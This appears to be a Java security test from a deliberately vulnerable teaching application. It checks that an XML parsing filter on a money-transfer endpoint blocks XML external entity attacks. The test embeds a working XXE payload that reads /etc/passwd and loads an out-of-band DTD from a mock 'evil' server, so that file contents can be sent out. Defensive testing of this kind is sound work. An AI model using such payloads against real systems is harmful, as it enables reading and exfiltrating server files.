/*
 * Copyright 2015-2023 Josh Cummings
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.joshcummings.codeplay.terracotta.app;

import com.joshcummings.codeplay.terracotta.AbstractEmbeddedTomcatTest;
import okhttp3.mockwebserver.Dispatcher;
import okhttp3.mockwebserver.MockResponse;
import okhttp3.mockwebserver.MockWebServer;
import okhttp3.mockwebserver.RecordedRequest;
import org.apache.commons.io.IOUtils;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.entity.BasicHttpEntity;
import org.testng.annotations.BeforeMethod;
import org.testng.annotations.Test;

import java.io.IOException;
import java.io.InputStream;
import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import static org.apache.http.client.methods.RequestBuilder.post;
import static org.testng.Assert.*;

/**
 * Security tests for ContentParsingFilter to verify XXE protection
 */
public class ContentParsingFilterSecurityTest extends AbstractEmbeddedTomcatTest {
    private MockWebServer evil;

    @BeforeMethod
    public void mockWebServer() {
        this.evil = new MockWebServer();
    }

    @Test
    public void testXxeProtectionOnTransferMoneyEndpoint() throws Exception {
        try (MockWebServer server = this.evil) {
            DispatchRecorder recorder = new DispatchRecorder();
            server.setDispatcher(recorder);
            server.start();

            // Create an XML with XXE payload targeting the TransferMoney endpoint
            String xxePayload = "<!DOCTYPE request [" +
                    "<!ENTITY % file SYSTEM \"file:///etc/passwd\">" +
                    "<!ENTITY % dtd SYSTEM \"http://localhost:" + server.getPort() + "/xxe/send.dtd\">" +
                    "%dtd;" +
                    "%send;" +
                    "]>" +
                    "<request><clientId>12345</clientId><accountNumber>987654321</accountNumber><amount>10.00</amount></request>";

            BasicHttpEntity body = new BasicHttpEntity();
            body.setContent(IOUtils.toInputStream(xxePayload, "UTF-8"));
            
            try (CloseableHttpResponse response = this.http.post(post("/transferMoney?c=finance")
                    .setHeader("Content-Type", "application/xml")
                    .setEntity(body))) {
                
                // If XXE protection is working properly, no requests should be made to the evil server
                recorder.assertNoRequests();
            }
        }
    }

    private InputStream xml(String location) {
        return this.getClass().getClassLoader().getResourceAsStream(location);
    }

    private class DispatchRecorder extends Dispatcher {
        List<RecordedRequest> requests = new ArrayList<>();
        Pattern REQUEST_PATH = Pattern.compile("/([^\\?]*)(?:\\?data=(.*))?");
        String secret;

        @Override
        public MockResponse dispatch(RecordedRequest request) throws InterruptedException {
            this.requests.add(request);
            String body = parsePath(request.getPath())
                    .map(this.getClass().getClassLoader()::getResourceAsStream)
                    .map(this::readFully)
                    .map(String::new)
                    .orElse("please come again");

            return new MockResponse().setBody(body);
        }

        public void assertNoRequests() {
            assertTrue(this.requests.isEmpty(), "XXE vulnerability detected: external request was made to evil server");
        }

        public void assertDoesNotHaveSecret() {
            assertNull(this.secret, "XXE vulnerability detected: data was exfiltrated to evil server");
        }

        private Optional<String> parsePath(String path) {
            Matcher m = REQUEST_PATH.matcher(path);
            if (m.find()) {
                this.secret = m.group(2);
                return Optional.of(m.group(1));
            }
            return Optional.empty();
        }

        private byte[] readFully(InputStream is) {
            try {
                return IOUtils.toByteArray(is);
            } catch (IOException e) {
                throw new IllegalStateException(e);
            }
        }
    }
}